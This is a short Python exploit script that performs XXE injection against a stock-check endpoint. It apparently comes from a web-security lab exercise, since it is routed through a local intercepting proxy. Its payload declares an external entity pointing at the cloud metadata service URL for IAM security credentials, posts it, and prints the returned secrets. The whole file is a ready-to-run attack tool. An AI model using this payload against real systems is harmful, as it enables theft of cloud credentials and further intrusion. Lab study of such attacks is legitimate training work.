import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_xxe(s, url):

    print("(+) Exploiting XXE Injection...")
    stock_url = url + "/product/stock"
    data_stock = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
    r = s.post(stock_url, data=data_stock, verify=False, proxies=proxies)
    print("(+) The following is the content of the secret file: ")
    print(r.text)

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    exploit_xxe(s, url)

if __name__ == "__main__":
    main()